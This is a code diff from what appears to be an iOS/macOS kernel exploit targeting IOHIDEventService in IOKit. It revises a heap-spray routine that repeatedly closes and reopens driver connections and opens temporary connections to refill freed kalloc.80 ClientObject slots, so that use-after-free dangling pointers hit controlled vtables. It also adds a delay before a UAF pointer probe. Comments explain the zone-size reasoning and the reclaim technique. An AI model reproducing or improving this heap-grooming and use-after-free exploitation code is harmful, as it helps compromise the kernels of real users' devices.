@@ -3491,26 +3491,41 @@ static const char kOpenPropertiesGarbage[] =
     uint32_t drainCloseErrs = 0, drainOpenErrs = 0;
     [self appendLog:[NSString stringWithFormat:@"  Allocation conditioning: %d close/reopen cycles across %d connections (ClientObject zone)...",
                      kMagazineDrainCycles, connCount]];
-    // Spray array: hold IOSurface refs to populate kalloc.48 with controlled data
-    NSMutableArray *spraySurfaces = [NSMutableArray array];
+    // ClientObject is ~72 bytes → kalloc.80 zone. IOSurfaceCreate allocates
+    // KB-sized objects in a different zone — useless for reclaiming freed
+    // ClientObject slots. Use temporary IOHIDEventService connections instead:
+    // each IOServiceOpen allocates a ClientObject from kalloc.80, filling the
+    // free list so dangling UAF pointers land on valid vtables, not free poison.
     for (int i = 0; i < kMagazineDrainCycles; i++) {
-        // Close all — ClientObjects freed to kalloc.48 zone
+        // Close all — ClientObjects freed to kalloc.80 zone
         for (int c = 0; c < connCount; c++) {
             uint64_t closeScalar = 0;
             kern_return_t ckr = sIOConnectCallMethod(connections[c], kSelectorClose,
                                  &closeScalar, 1, NULL, 0, NULL, NULL, NULL, NULL);
             if (ckr != KERN_SUCCESS) drainCloseErrs++;
         }
-        // Spray IOSurface with magic pattern 0x41414141 encoded in allocSize
-        for (int s = 0; s < 50; s++) {
-            IOSurfaceRef sf = IOSurfaceCreate((CFDictionaryRef)@{
-                (id)kIOSurfaceWidth: @(0x41), (id)kIOSurfaceHeight: @(0x41),
-                (id)kIOSurfaceBytesPerRow: @(0x4141), (id)kIOSurfaceBytesPerElement: @(4),
-                (id)kIOSurfacePixelFormat: @(0x41414141), (id)kIOSurfaceAllocSize: @(0x4141),
-            });
-            if (sf) { [spraySurfaces addObject:(__bridge id)sf]; CFRelease(sf); }
+
+        // Spray kalloc.80: temp connections whose ClientObjects fill freed slots
+        int tmpCount = 0;
+        for (int s = 0; s < 200 && tmpCount < 250; s++) {
+            io_service_t ts = sIOServiceGetMatchingService(0,
+                sIOServiceMatching("IOHIDEventService"));
+            if (ts == MACH_PORT_NULL) continue;
+            io_connect_t tc = MACH_PORT_NULL;
+            if (sIOServiceOpen(ts, mach_task_self(), 2, &tc) == KERN_SUCCESS && tc != MACH_PORT_NULL) {
+                // Gate the temp conn: writes provider state, anchors ClientObject in kalloc.80
+                uint64_t ts0 = 0;
+                sIOConnectCallMethod(tc, kSelectorOpen, &ts0, 1,
+                    kOpenPropertiesXML, strlen(kOpenPropertiesXML) + 1,
+                    NULL, NULL, NULL, NULL);
+                sIOServiceClose(tc); // tear down — but slot was filled with valid vtable
+                tmpCount++;
+            }
+            sIOObjectRelease(ts);
         }
-        // Reopen — some allocations may reuse our sprayed slots
+        [self appendLog:[NSString stringWithFormat:@"  Drain[%d]: %d temp conns sprayed kalloc.80", i, tmpCount]];
+
+        // Reopen main connections — remaining freed slots get fresh ClientObjects
         for (int c = connCount - 1; c >= 0; c--) {
             uint64_t openScalar = 0;
             const char *xml = kOpenPropertiesXML;
@@ -3977,6 +3992,9 @@ static const char kOpenPropertiesGarbage[] =
     }
 
     // ---- Probe: try 3 DIFFERENT IOHIDEventService instances ----
+    // Allow providers to recover from UAF stress before probing
+    [self appendLog:@"\n  Waiting 500ms for provider recovery..."];
+    usleep(500000);
     [self appendLog:@"\n====== UAF Dangling Pointer Probe ======"];
     for (int inst = 0; inst < 3; inst++) {
         io_service_t svc = sIOServiceGetMatchingService(0,
